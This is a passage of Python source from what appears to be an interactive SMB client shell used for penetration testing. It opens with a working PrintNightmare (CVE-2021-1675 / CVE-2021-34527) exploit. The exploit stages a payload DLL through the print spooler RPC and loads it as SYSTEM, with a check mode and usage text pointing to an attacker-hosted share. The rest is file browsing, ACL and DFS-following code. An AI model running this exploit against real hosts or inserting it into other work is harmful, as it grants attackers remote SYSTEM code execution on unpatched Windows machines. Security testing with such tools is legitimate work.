        dll_filename = ntpath.basename(clean_dll)
        print(f"[*] Stage 2: Moving staged payload to driver backup store...")
        container['DriverInfo']['Level2']['pConfigFile'] = rprn.checkNullString("C:\\Windows\\System32\\ntdll.dll")
        try:
            rprn.hRpcAddPrinterDriverEx(dce, pName=NULL, pDriverContainer=container, dwFileCopyFlags=flags)
        except Exception:
            pass

        print(f"[*] Stage 2: Finding and executing staged payload ({dll_filename})...")
        executed = False
        for i in range(1, max_tries + 1):
            staged_target = f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{dll_filename}"
            container['DriverInfo']['Level2']['pConfigFile'] = rprn.checkNullString(staged_target)
            try:
                resp = rprn.hRpcAddPrinterDriverEx(dce, pName=NULL, pDriverContainer=container, dwFileCopyFlags=flags)
                err = resp.get('ErrorCode', 0) if isinstance(resp, dict) else getattr(resp, 'ErrorCode', 0)
                if err == 0:
                    print(f"[+] SUCCESS! DLL loaded as SYSTEM from: {staged_target}")
                    executed = True
                    break
            except rprn.DCERPCSessionError as e:
                if e.error_code in (system_errors.ERROR_FILE_NOT_FOUND, system_errors.ERROR_PATH_NOT_FOUND):
                    continue
                elif e.error_code == 0:
                    print(f"[+] SUCCESS! DLL loaded as SYSTEM from: {staged_target}")
                    executed = True
                    break
                else:
                    continue
            except Exception:
                continue

        if not executed:
            print(f"[-] DLL was staged but could not find loaded copy within {max_tries} iterations.")
            print("[*] You can retry with a higher iteration count using '-t <num>'.")
            return False
        return True

    def do_printnightmare(self, line):
        """printnightmare [--check | --list | <dll_path>] [options]
Exploits and checks PrintNightmare (CVE-2021-1675 / CVE-2021-34527) via MS-RPRN named pipe (\\pipe\\spoolss).
Allows SYSTEM remote code execution or privilege escalation over SMB.

Modes:
  --check, -c           - Non-intrusively check if target is vulnerable
  --list, -l            - List installed printer drivers and paths
  --delete <name>       - Delete an installed printer driver
  <dll_path>            - Exploit using specified DLL (UNC or local path)

Options:
  --dll <path>          - Path to payload DLL (UNC: \\\\IP\\share\\payload.dll, or local: C:\\Temp\\payload.dll)
  -d, --driver-name     - Custom printer driver name (default: auto-generated)
  -p, --driver-path     - Path to base driver UNIDRV.DLL (default: auto-detected from filerepository)
  -e, --env             - Environment architecture (default: 'Windows x64')
  -t, --tries           - Max directory iterations for staged DLL execution (default: 30)
  -h, --help            - Show this help message
"""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        parts = shlex.split(line) if line else []
        if not parts or any(p in ('-h', '--help', 'help') for p in parts):
            self.help_printnightmare()
            return

        mode = "exploit"
        dll_path = None
        driver_name = None
        driver_path = None
        environment = "Windows x64"
        max_tries = 30
        delete_target = None

        idx = 0
        while idx < len(parts):
            p = parts[idx]
            if p in ('--check', '-c', 'check'):
                mode = "check"
            elif p in ('--list', '-l', 'list'):
                mode = "list"
            elif p in ('--delete', 'delete'):
                mode = "delete"
                if idx + 1 < len(parts) and not parts[idx + 1].startswith('-'):
                    idx += 1
                    delete_target = parts[idx]
            elif p in ('--dll', '-dll'):
                if idx + 1 < len(parts):
                    idx += 1
                    dll_path = parts[idx]
            elif p in ('-d', '--driver-name', '-name', '--name'):
                if idx + 1 < len(parts):
                    idx += 1
                    driver_name = parts[idx]
            elif p in ('-p', '--driver-path', '-path', '--path'):
                if idx + 1 < len(parts):
                    idx += 1
                    driver_path = parts[idx]
            elif p in ('-e', '--env', '-environment', '--environment'):
                if idx + 1 < len(parts):
                    idx += 1
                    environment = parts[idx]
            elif p in ('-t', '--tries', '-iterator', '--iterator'):
                if idx + 1 < len(parts):
                    idx += 1
                    try:
                        max_tries = int(parts[idx])
                    except ValueError:
                        pass
            elif not p.startswith('-') and dll_path is None and mode == "exploit":
                dll_path = p
            idx += 1

        target_host = self.smb.getRemoteHost()
        print("=" * 60)
        print("[*] PrintNightmare (CVE-2021-1675 / CVE-2021-34527)")
        print(f"[*] Target Host: {target_host}")
        print(f"[*] Mode:        {mode.upper()}")
        print("=" * 60)

        dce = self._printnightmare_connect()
        if dce is None:
            print("[-] Unable to bind to Print Spooler RPC (\\pipe\\spoolss).")
            print("[-] Possible reasons:")
            print("    1. Print Spooler service ('spoolsv.exe') is disabled or stopped.")
            print("    2. Named pipe \\pipe\\spoolss is blocked by firewall or network policy.")
            print("=" * 60)
            return

        if mode == "check":
            print("[*] Performing non-intrusive vulnerability probe...")
            vuln, reason = self._printnightmare_check(dce)
            print("=" * 60)
            if vuln:
                print("[+] STATUS: VULNERABLE to PrintNightmare (CVE-2021-1675)!")
                print(f"[+] Details: {reason}")
                print("[*] Next step: Host a payload DLL (Samba/SMB) or upload via SMB, then run:")
                print("    printnightmare \\\\<your_ip>\\<share>\\payload.dll")
                print("    OR (if uploaded via SMB to target disk):")
                print("    printnightmare C:\\Windows\\Temp\\payload.dll")
            else:
                print("[-] STATUS: NOT VULNERABLE / PATCHED")
                print(f"[-] Details: {reason}")
            print("=" * 60)

        elif mode == "list":
            print(f"[*] Enumerating installed printer drivers (Environment: {environment})...")
            drivers = self._printnightmare_list(dce, environment)
            print("=" * 60)
            if not drivers:
                print("[-] No printer drivers returned or enumeration failed.")
            else:
                print(f"[+] Found {len(drivers)} installed printer driver(s):")
                print("-" * 60)
                for i, d in enumerate(drivers, 1):
                    name = d.get('Name', 'Unknown')
                    drv = d.get('DriverPath', 'Unknown')
                    cfg = d.get('ConfigFile', 'Unknown')
                    dat = d.get('DataFile', 'Unknown')
                    print(f"  [{i}] Driver Name: {name}")
                    print(f"      Driver Path: {drv}")
                    print(f"      Config File: {cfg}")
                    print(f"      Data File:   {dat}")
                    print()
            print("=" * 60)

        elif mode == "delete":
            if not delete_target:
                print("[-] Driver name required for deletion. Usage: printnightmare --delete <driver_name>")
                print("=" * 60)
                return
            self._printnightmare_delete(dce, delete_target, environment)
            print("=" * 60)

        elif mode == "exploit":
            if not dll_path:
                print("[-] Missing DLL path. Specify a UNC share or local target file path.")
                print("    Usage: printnightmare <\\\\attacker\\share\\payload.dll | C:\\path\\payload.dll>")
                print("    Run 'help printnightmare' for complete documentation.")
                print("=" * 60)
                return
            self._printnightmare_exploit(dce, dll_path, driver_name=driver_name, driver_path=driver_path, environment=environment, max_tries=max_tries)
            print("=" * 60)

    def _resolve_share_type(self, type_int):

        attributes = []
        if type_int & srvs.STYPE_SPECIAL:
            attributes.append("SPECIAL")
            type_int ^= srvs.STYPE_SPECIAL
        if type_int & srvs.STYPE_TEMPORARY:
            attributes.append("TEMP")
            type_int ^= srvs.STYPE_TEMPORARY
        type_str = "UNKNOWN"
        if type_int == srvs.STYPE_DISKTREE:
            type_str = "DISK"
        elif type_int == srvs.STYPE_PRINTQ:
            type_str = "PRINT"
        elif type_int == srvs.STYPE_DEVICE:
            type_str = "DEVICE"
        elif type_int == srvs.STYPE_IPC:
            type_str = "IPC"
        if attributes:
            return f"{type_str} ({','.join(attributes)})"
        return type_str

    def do_shares(self, line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        resp = self.smb.listShares()
        fmt = "{:<25} {:<15} {}"
        print(fmt.format("Share Name", "Type", "Comment"))
        print("-" * 70)
        if self.outputfile is not None:
            f = open(self.outputfile, 'a')
        for i in range(len(resp)):
            share_name = resp[i]['shi1_netname'][:-1]
            share_remark = resp[i]['shi1_remark'][:-1]
            share_type_int = resp[i]['shi1_type']
            share_type = self._resolve_share_type(share_type_int)
            if self.outputfile:
                f.write(f"{share_name}|{share_type}|{share_remark}\n")
            print(fmt.format(share_name, share_type, share_remark))
        if self.outputfile:
            f.close()

    def do_use(self,line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        self._reset_dfs_state()
        self.share = line
        self.tid = self.smb.connectTree(line)
        self.pwd = '\\'
        self.do_ls('', False)

    def complete_cd(self, text, line, begidx, endidx):
        return self.complete_get(text, line, begidx, endidx, include = 2)

    def do_cd(self, line):
        if self.tid is None:
            LOG.error("No share selected")
            return
        if not line or not line.strip():
            return

        p = line.replace('/', '\\')
        oldpwd = self.pwd

        # DFS boundary detection — must happen BEFORE normpath which clips above-root paths
        if self.is_dfs_context:
            resolved, escaped, remaining = self._resolve_path_with_dfs_boundary(line)
            if escaped:
                self._restore_original_connection()
                # If there are remaining forward components, navigate them in parent context
                if remaining:
                    self.do_cd('\\'.join(remaining))
                return
            self.pwd = resolved
        else:
            # Non-DFS: standard path resolution
            if p[0] == '\\':
                self.pwd = line
            else:
                self.pwd = ntpath.join(self.pwd, line)
            self.pwd = ntpath.normpath(self.pwd)

        # Let's try to open the directory to see if it's valid
        try:
            fid = self.smb.openFile(self.tid, self.pwd, creationOption = FILE_DIRECTORY_FILE, desiredAccess = FILE_READ_DATA |
                                   FILE_LIST_DIRECTORY, shareMode = FILE_SHARE_READ | FILE_SHARE_WRITE )
            self.smb.closeFile(self.tid,fid)
        except SessionError as e:
            if e.getErrorCode() == STATUS_PATH_NOT_COVERED:
                # DFS link detected
                if not self.dfs_auto_follow:
                    # OPSEC: don't create new connections, just show referral info
                    self.pwd = oldpwd
                    try:
                        smb_conn, share = self._get_dfs_root_context()
                        dfs_path_full = '\\\\%s\\%s\\%s' % (smb_conn.getRemoteHost(), share, ntpath.normpath(ntpath.join(oldpwd, line)).lstrip('\\'))
                        referrals = smb_conn.getDFSReferral(dfs_path_full)
                        if referrals:
                            LOG.warning("DFS link detected but auto-follow is disabled (OPSEC)")
                            print("  DFS Path: %s" % dfs_path_full)
                            print("  Targets:")
                            for i, ref in enumerate(referrals):
                                print("    [%d] %s (%s)" % (i, ref['network_address'],
                                      "Root" if ref['server_type'] == 1 else "Link"))
                            print("  Use 'dfs_mode on' or restart with '-dfs-follow' to enable auto-follow")
                        else:
                            LOG.warning("DFS link detected but no referrals returned. Auto-follow is disabled (OPSEC)")
                    except Exception as dfs_err:
                        LOG.warning("DFS link detected but auto-follow is disabled (OPSEC). Referral lookup failed: %s" % str(dfs_err))
                    return
                # Auto-follow enabled - resolve and follow
                try:
                    self._follow_dfs_link(self.pwd)
                    return
                except Exception as dfs_error:
                    self.pwd = oldpwd
                    LOG.error("DFS resolution failed: %s" % str(dfs_error))
                    return
            self.pwd = oldpwd
            raise

    def do_lcd(self, s):
        print(s)
        if s == '':
           print(os.getcwd())
        else:
           os.chdir(s)

    def do_ls(self, wildcard, display = True):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        if self.tid is None:
            LOG.error("No share selected")
            return
        if wildcard == '':
           pwd = ntpath.join(self.pwd,'*')
        else:
           pwd = ntpath.join(self.pwd, wildcard)
        self.completion = []
        pwd = pwd.replace('/','\\')
        pwd = ntpath.normpath(pwd)
        if self.outputfile is not None:
            of = open(self.outputfile, 'a')
        is_dfs = self._is_dfs_share()
        for f in self.smb.listPath(self.share, pwd):
            if display is True:
                dfs_marker = ''
                if is_dfs and f.is_directory() and f.is_reparse_point() and f.get_longname() not in ('.', '..'):
                    dfs_marker = ' [DFS]'
                if self.outputfile:
                    of.write("%crw-rw-rw- %10d  %s %s%s" % (
                    'd' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())),
                    f.get_longname(), dfs_marker) + "\n")

                print("%crw-rw-rw- %10d  %s %s%s" % (
                'd' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())),
                f.get_longname(), dfs_marker))
            self.completion.append((f.get_longname(), f.is_directory()))
        if self.outputfile:
            of.close()
    
    def do_lls(self, currentDir):
        if currentDir == "":
            currentDir = "./"
        else:
            pass
        for LINE in os.listdir(currentDir):
            print(LINE)

    def do_listFiles(self, share, ip):
        retList = []
        retFiles = []
        retInt = 0
        try:                
            for LINE in self.smb.listPath(self.share, ip):
                if(LINE.get_longname() == "." or LINE.get_longname() == ".."):
                    pass
                else:
                    retInt = retInt + 1
                    print(ip.strip("*").replace("//","/") + LINE.get_longname())
                    if(LINE.is_directory()):
                        retval = ip.strip("*").replace("//","/") + LINE.get_longname()
                        retList.append(retval)
                    else:
                        retval = ip.strip("*").replace("//","/") + LINE.get_longname()
                        retFiles.append(retval)
        except:
            pass
        return retList,retFiles,retInt

    def do_tree(self, filepath):
        folderList = []
        retList = []
        totalFilesRead = 0
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        if self.tid is None:
            LOG.error("No share selected")
            return

        filepath = filepath.replace("\\", "/")
        if not filepath.startswith("/"):
            filepath = self.pwd.replace("\\", "/")  + "/" + filepath
        if(not filepath.endswith("/*")):
            filepath = filepath + "/*"
        filepath = os.path.abspath(filepath).replace("//","/")

        for LINE in self.smb.listPath(self.share, filepath):
            if(LINE.is_directory()):
                if(LINE.get_longname() == "." or LINE.get_longname() == ".."):
                    pass
                else:
                    totalFilesRead = totalFilesRead + 1 
                    folderList.append(filepath.strip("*") + LINE.get_longname())
            else:
                print(filepath.strip("*") + LINE.get_longname())
        for ITEM in folderList:
            ITEM = ITEM + "/*"
            try: 
                retList, retFiles, retInt = self.do_listFiles(self.share,ITEM)
                for q in retList:
                    folderList.append(q)
                totalFilesRead = totalFilesRead + retInt
            except:
                pass
        print("Finished - " + str(totalFilesRead) + " files and folders")

    def do_rm(self, filename):
        if self.tid is None:
            LOG.error("No share selected")
            return
        f = ntpath.join(self.pwd, filename)
        file = f.replace('/','\\')
        self.smb.deleteFile(self.share, file)

    def do_mkdir(self, path):
        if self.tid is None:
            LOG.error("No share selected")
            return
        p = ntpath.join(self.pwd, path)
        pathname = p.replace('/','\\')
        self.smb.createDirectory(self.share,pathname)

    def do_rmdir(self, path):
        if self.tid is None:
            LOG.error("No share selected")
            return
        p = ntpath.join(self.pwd, path)
        pathname = p.replace('/','\\')
        self.smb.deleteDirectory(self.share, pathname)

    def do_put(self, pathname):
        if self.tid is None:
            LOG.error("No share selected")
            return
        src_path = pathname
        dst_name = os.path.basename(src_path)

        fh = open(pathname, 'rb')
        f = ntpath.join(self.pwd,dst_name)
        finalpath = f.replace('/','\\')
        self.smb.putFile(self.share, finalpath, fh.read)
        fh.close()

    def complete_get(self, text, line, begidx, endidx, include = 1):
        # include means
        # 1 just files
        # 2 just directories
        p = line.replace('/','\\')
        if p.find('\\') < 0:
            items = []
            if include == 1:
                mask = 0
            else:
                mask = 0x010
            for i in self.completion:
                if i[1] == mask:
                    items.append(i[0])
            if text:
                return  [
                    item for item in items
                    if item.upper().startswith(text.upper())
                ]
            else:
                return items

    def do_mget(self, mask):
        if mask == '':
            LOG.error("A mask must be provided")
            return
        if self.tid is None:
            LOG.error("No share selected")
            return
        self.do_ls(mask,display=False)
        if len(self.completion) == 0:
            LOG.error("No files found matching the provided mask")
            return 
        for file_tuple in self.completion:
            if file_tuple[1] == 0:
                filename = file_tuple[0]
                filename = filename.replace('/', '\\')
                fh = open(ntpath.basename(filename), 'wb')
                pathname = ntpath.join(self.pwd, filename)
                try:
                    LOG.info("Downloading %s" % (filename))
                    self.smb.getFileEx(self.share, pathname, fh.write)
                except:
                    fh.close()
                    os.remove(filename)
                    raise
                fh.close()

    def do_rget(self, mask):
        if mask == '':
            mask = '*'
        if self.tid is None:
            LOG.error("No share selected")
            return
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return

        root_pwd = self.pwd
        folderList = [root_pwd]

        for ITEM in folderList:
            self.pwd = ITEM

            try:
                self.do_ls('*', display=False)

                for file_tuple in self.completion:
                    filename = file_tuple[0]
                    is_directory = file_tuple[1]

                    if filename in ['.', '..']:
                        continue

                    if is_directory:
                        folderList.append(ntpath.join(ITEM, filename))

                self.do_ls(mask, display=False)

                for file_tuple in self.completion:
                    filename = file_tuple[0]
                    is_directory = file_tuple[1]

                    if filename in ['.', '..'] or is_directory:
                        continue

                    filename = filename.replace('/', '\\')
                    local_path = ntpath.relpath(ITEM, root_pwd)
                    if local_path == '.':
                        local_path = ''
                    local_path = local_path.replace('\\', os.sep)
                    local_file = os.path.join(local_path, ntpath.basename(filename)) if local_path else ntpath.basename(filename)
                    local_dir = os.path.dirname(local_file)

                    if local_dir and not os.path.exists(local_dir):
                        os.makedirs(local_dir)

                    fh = open(local_file, 'wb')
                    pathname = ntpath.join(ITEM, filename)
                    try:
                        LOG.info("Downloading %s" % local_file)
                        self.smb.getFileEx(self.share, pathname, fh.write)
                    except:
                        fh.close()
                        os.remove(local_file)
                        raise
                    fh.close()
            finally:
                self.pwd = root_pwd

    def do_get(self, filename):
        if self.tid is None:
            LOG.error("No share selected")
            return
        filename = filename.replace('/','\\')
        fh = open(ntpath.basename(filename),'wb')
        pathname = ntpath.join(self.pwd,filename)
        try:
            self.smb.getFileEx(self.share, pathname, fh.write)
        except:
            fh.close()
            os.remove(filename)
            raise
        fh.close()

    def complete_cat(self, text, line, begidx, endidx):
        return self.complete_get(text, line, begidx, endidx, include=1)
    
    def do_cat(self, filename):
        if self.tid is None:
            LOG.error("No share selected")
            return
        filename = filename.replace('/','\\')
        fh = BytesIO()
        pathname = ntpath.join(self.pwd,filename)
        try:
            self.smb.getFileEx(self.share, pathname, fh.write)
        except:
            raise
        output = fh.getvalue()
        encoding = chardet.detect(output)["encoding"]
        error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
        if self.outputfile is not None:
            f = open(self.outputfile, 'a')
        if encoding:
            try:
                if self.outputfile:
                    f.write(output.decode(encoding) + '\n')
                    f.close()
                print(output.decode(encoding))
            except:
                if self.outputfile:
                    f.write(error_msg + '\n')
                    f.close()
                print(error_msg)
            finally:
                fh.close()
        else:
            if self.outputfile:
                f.write(error_msg + '\n')
                f.close()
            print(error_msg)
            fh.close()

    def do_close(self, line):
        self.do_logoff(line)

    def do_list_snapshots(self, line):
        l = line.split(' ')
        if len(l) > 0:
            pathName= l[0].replace('/','\\')

        # Relative or absolute path?
        if pathName.startswith('\\') is not True:
            pathName = ntpath.join(self.pwd, pathName)

        snapshotList = self.smb.listSnapshots(self.tid, pathName)

        if not snapshotList:
            print("No snapshots found")
            return

        for timestamp in snapshotList:
            print(timestamp)

    def do_mount(self, line):
        l = line.split(' ')
        if len(l) > 1:
            target  = l[0].replace('/','\\')
            pathName= l[1].replace('/','\\')

        # Relative or absolute path?
        if pathName.startswith('\\') is not True:
            pathName = ntpath.join(self.pwd, pathName)

        self.smb.createMountPoint(self.tid, pathName, target)

    def do_umount(self, mountpoint):
        mountpoint = mountpoint.replace('/','\\')


        # Relative or absolute path?
        if mountpoint.startswith('\\') is not True:
            mountpoint = ntpath.join(self.pwd, mountpoint)

        mountPath = ntpath.join(self.pwd, mountpoint)

        self.smb.removeMountPoint(self.tid, mountPath)

    def do_acl(self, line):
        if self.tid is None:
            LOG.error("No share selected")
            return
        parts = line.split()
        if len(parts) == 0:
            LOG.error("Usage: acl {filename,action,permissions,user/group} actions: grant/revoke, "
                      "supported permissions : R/W/D/X/F")
            return
        
        filename = parts[0].replace('/','\\')
        # Relative or absolute path?
        if filename.startswith('\\') is not True:
            filename = ntpath.join(self.pwd, filename)
        
        smb_file_acl = None

        try:
            if len(parts) == 1:
                smb_file_acl = SMBFileACL(smb_connection=self.smb)
                resp = smb_file_acl.get_permissions(self.share, filename)
                print(resp)
            else:
                action = parts[1].lower()

                if action not in ['grant', 'revoke']:
                    LOG.error("Action must be 'grant' or 'revoke'")
                    return

                if len(parts) < 3:
                    LOG.error("Permissions required. Supported: R (read), W (write), D (delete), X (execute), F (full control)")
                    return

                permissions = parts[2]

                if len(parts) < 4:
                    LOG.error("User/group name is required")
                    return

                user = parts[3]

                smb_file_acl = SMBFileACL(smb_connection=self.smb)
                smb_file_acl.set_permissions(self.share, filename, user, permissions, action)
                if action == 'grant':
                    print("Successfully granted permissions to %s" % user)
                elif action == 'revoke':
                    print("Successfully revoked permissions from %s" % user)
        finally:
            if smb_file_acl:
                smb_file_acl.close_connection()

    def _is_dfs_share(self):
        """Check if the current share has DFS capability."""
        if self.tid is None or self.smb is None:
            return False
        try:
            smb_inner = self.smb.getSMBServer()
            if hasattr(smb_inner, '_Session') and self.tid in smb_inner._Session.get('TreeConnectTable', {}):
                return smb_inner._Session['TreeConnectTable'][self.tid].get('IsDfsShare', False)
        except Exception:
            pass
        return False

    def _resolve_path_with_dfs_boundary(self, line):
        """Resolve a relative path, detecting if it crosses the DFS root boundary.

        Returns:
            (resolved_path, escaped, remaining_parts_after_escape)
            - resolved_path: the normalized path within DFS target (only valid if escaped=False)
            - escaped: True if the path attempts to go above '\\' (DFS target root)
            - remaining_parts_after_escape: path components remaining after the escape
              (to be interpreted on the parent context)
        """
        p = line.replace('/', '\\')

        if not p or p == '.':
            return self.pwd, False, []

        if p.startswith('\\'):
            # Absolute path — stays within current DFS target context
            return ntpath.normpath(p), False, []

        # Relative path — walk components to detect boundary crossing
        current_parts = [x for x in self.pwd.split('\\') if x]
        path_parts = [x for x in p.split('\\') if x]

        for i, part in enumerate(path_parts):
            if part == '..':
                if current_parts:
                    current_parts.pop()
                else:
                    # Trying to go above root — boundary crossed
                    remaining = path_parts[i + 1:]
                    return None, True, remaining
            elif part != '.':
                current_parts.append(part)

        resolved = '\\' + '\\'.join(current_parts) if current_parts else '\\'
        return resolved, False, []

    def _get_dfs_root_context(self):
        """Return (smb_conn, share) for the DFS namespace root."""
        if self.dfs_context_stack:
            root = self.dfs_context_stack[0]
            return root['smb'], root['share']
        return self.smb, self.share

    def _build_dfs_path(self, path=''):
        """Build a full DFS UNC path for the current location."""
        smb_conn, share = self._get_dfs_root_context()
        server = smb_conn.getRemoteHost()
        if path:
            return '\\\\%s\\%s\\%s' % (server, share, path.lstrip('\\'))
        else:
            return '\\\\%s\\%s' % (server, share)

    def _reset_dfs_state(self):
        """Reset DFS state when switching shares or logging off."""
        if self.dfs_context_stack:
            # Restore to the very first (root) connection
            root = self.dfs_context_stack[0]
            self.smb = root['smb']
            self.tid = root['tid']
            self.share = root['share']
        self.dfs_context_stack = []
        self.dfs_target_info = None
        self.dfs_referral_cache = {}
        # Close cached DFS connections
        for key, conn in self.dfs_connections.items():
            try:
                conn.logoff()
            except Exception:
                pass
        self.dfs_connections = {}

    def _push_dfs_context(self, pwd):
        """Save the current connection state onto the DFS context stack."""
        self.dfs_context_stack.append({
            'smb': self.smb,
            'tid': self.tid,
            'share': self.share,
            'pwd': pwd,
            'dfs_target_info': self.dfs_target_info,
        })

    def _pop_dfs_context(self):
        """Pop and restore the most recent DFS connection state from the stack."""
        prev = self.dfs_context_stack.pop()
        self.smb = prev['smb']
        self.tid = prev['tid']
        self.share = prev['share']
        self.pwd = prev['pwd']
        self.dfs_target_info = prev.get('dfs_target_info')

    def _restore_original_connection(self):
        """Restore previous connection when navigating out of a DFS link (pop from stack)."""
        if not self.dfs_context_stack:
            return
        smb, share = self.smb.getRemoteHost(), self.share
        self._pop_dfs_context()
        LOG.info("Leaving DFS link \\\\%s\\%s, returning to \\\\%s\\%s" % (
            smb, share, self.smb.getRemoteHost(), self.share))

    def _follow_dfs_link(self, path):
        """Resolve a DFS link and switch to the target connection.
        Supports nested DFS (stack-based), multi-target failover, and connection health checks."""
        # Build full DFS UNC path — try current server first (for nested DFS),
        # fall back to root namespace server
        dfs_path = '\\\\%s\\%s\\%s' % (self.smb.getRemoteHost(), self.share, path.lstrip('\\'))

        # Check cache first
        if dfs_path in self.dfs_referral_cache:
            referrals = self.dfs_referral_cache[dfs_path]
        else:
            LOG.info("Resolving DFS path: %s" % dfs_path)
            try:
                referrals = self.smb.getDFSReferral(dfs_path)
            except Exception:
                # Fall back to root namespace server for nested DFS
                if self.dfs_context_stack:
                    root_smb, root_share = self._get_dfs_root_context()
                    dfs_path = '\\\\%s\\%s\\%s' % (root_smb.getRemoteHost(), root_share, path.lstrip('\\'))
                    LOG.info("Retrying DFS referral via root: %s" % dfs_path)
                    referrals = root_smb.getDFSReferral(dfs_path)
                else:
                    raise
            self.dfs_referral_cache[dfs_path] = referrals

        if not referrals:
            raise Exception("No DFS referrals returned for path: %s" % dfs_path)

        # Multi-target failover: try all referral targets in order
        last_error = None
        save_pwd = ntpath.dirname(self.pwd) if self.pwd != '\\' else '\\'

        for ref in referrals:
            target_server = ref['target_server']
            target_share = ref['target_share']
            target_path = ref.get('target_path', '')

            if not target_server or not target_share:
                continue

            LOG.info("DFS target: \\\\%s\\%s%s" % (target_server, target_share,
                     ('\\' + target_path) if target_path else ''))

            try:
                # Get or create connection to target server
                conn_key = target_server.lower()
                target_smb = self.dfs_connections.get(conn_key)

                # Health check: if cached connection exists, try connectTree
                # If it fails, discard and recreate
                target_tid = None
                if target_smb is not None:
                    try:
                        target_tid = target_smb.connectTree(target_share)
                    except Exception:
                        LOG.debug("Cached DFS connection to %s is dead, reconnecting" % target_server)
                        try:
                            target_smb.logoff()
                        except Exception:
                            pass
                        del self.dfs_connections[conn_key]
                        target_smb = None

                if target_smb is None:
                    target_smb = SMBConnection(target_server, target_server, sess_port=445)
                    if self.use_kerberos:
                        target_smb.kerberosLogin(self.username, self.password, self.domain,
                                                 self.lmhash, self.nthash, self.aesKey,
                                                 kdcHost=self.kdcHost, TGT=self.TGT, TGS=None)
                    else:
                        target_smb.login(self.username, self.password, self.domain,
                                         self.lmhash, self.nthash)
                    self.dfs_connections[conn_key] = target_smb
                    target_tid = target_smb.connectTree(target_share)

                if target_path:
                    try:
                        probe_fid = target_smb.openFile(target_tid, '\\' + target_path,
                                                        creationOption=FILE_DIRECTORY_FILE,
                                                        desiredAccess=FILE_READ_DATA | FILE_LIST_DIRECTORY,
                                                        shareMode=FILE_SHARE_READ | FILE_SHARE_WRITE)
                        target_smb.closeFile(target_tid, probe_fid)
                    except SessionError as e:
                        if e.getErrorCode() != STATUS_PATH_NOT_COVERED:
                            raise
                        # Nested DFS link — push state, switch, and recurse
                        base_depth = len(self.dfs_context_stack)
                        self._push_dfs_context(save_pwd)
                        self.smb = target_smb
                        self.tid = target_tid
                        self.share = target_share
                        self.pwd = '\\' + target_path
                        self.dfs_target_info = ref
                        try:
                            self._follow_dfs_link(self.pwd)
                            if len(self.dfs_context_stack) > base_depth + 1:
                                self.dfs_context_stack = self.dfs_context_stack[:base_depth + 1]
                            return
                        except Exception:
                            while len(self.dfs_context_stack) > base_depth:
                                self._pop_dfs_context()
                            raise

                # Push current state AFTER successful connectTree (so stack is not corrupted on error)
                self._push_dfs_context(save_pwd)

                # Switch to DFS target
                self.smb = target_smb
                self.tid = target_tid
                self.share = target_share
                self.pwd = '\\' + target_path if target_path else '\\'
                self.dfs_target_info = ref
                return  # Success

            except Exception as e:
                LOG.warning("DFS target \\\\%s\\%s failed: %s, trying next..." % (
                    target_server, target_share, str(e)))
                last_error = e
                continue

        raise Exception("All DFS targets failed for path: %s. Last error: %s" % (
            dfs_path, str(last_error)))

    def do_dfs_info(self, line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        if self.tid is None:
            LOG.error("No share selected")
            return

        # Build DFS path — use root namespace context
        smb_conn, share = self._get_dfs_root_context()

        if line:
            p = line.replace('/', '\\')
            if not p.startswith('\\'):
                p = ntpath.join(self.pwd, p)
            p = ntpath.normpath(p)
        else:
            p = self.pwd

        dfs_path = '\\\\%s\\%s\\%s' % (smb_conn.getRemoteHost(), share, p.lstrip('\\'))

        try:
            referrals = smb_conn.getDFSReferral(dfs_path)
        except SessionError as e:
            LOG.error("Failed to get DFS referral: %s" % str(e))
            return

        if not referrals:
            print("No DFS referrals found for: %s" % dfs_path)
            return

        print("DFS Path: %s" % dfs_path)
        print("Referrals:")
        for i, ref in enumerate(referrals):
            server_type = "Root" if ref['server_type'] == 1 else "Link"
            print("  [%d] Type: %s" % (i, server_type))
            print("      Target: %s" % ref['network_address'])
            if ref['target_path']:
                print("      Path: %s" % ref['target_path'])
            print("      TTL: %d seconds" % ref['ttl'])

    def do_dfs_mode(self, line):
        """Toggle or display DFS auto-follow mode. Usage: dfs_mode [on|off]"""
        line = line.strip().lower()
        if line == '':
            status = 'ON' if self.dfs_auto_follow else 'OFF'
            print("DFS auto-follow is currently %s" % status)
            if not self.dfs_auto_follow:
                print("  Use 'dfs_mode on' to enable automatic DFS link following (creates new SMB connections)")
                print("  Or use '-dfs-follow' CLI argument at startup")
        elif line in ('on', '1', 'true', 'enable'):
            self.dfs_auto_follow = True
            LOG.info("DFS auto-follow enabled - cd into DFS links will create new SMB connections")
        elif line in ('off', '0', 'false', 'disable'):
            self.dfs_auto_follow = False
            LOG.info("DFS auto-follow disabled - cd into DFS links will show referral info only")
        else:
            LOG.error("Usage: dfs_mode [on|off]")

    def do_pwd(self, line):
        if self.loggedIn is False:
            LOG.error("Not logged in")
            return
        if self.is_dfs_context and self.dfs_target_info:
            root = self.dfs_context_stack[0]
            print("\\\\%s\\%s (DFS [depth=%d] -> \\\\%s\\%s%s)" % (
                root['smb'].getRemoteHost(),
                root['share'],
                len(self.dfs_context_stack),
                self.smb.getRemoteHost(),
                self.share,
                self.pwd.replace("\\", "/")))
        else:
            print(self.pwd.replace("\\","/"))
        if self.outputfile is not None:
            f = open(self.outputfile, 'a')
            f.write(self.pwd.replace("\\","/"))
            f.close()

    def do_EOF(self, line):
        print('Bye!\n')
        return True
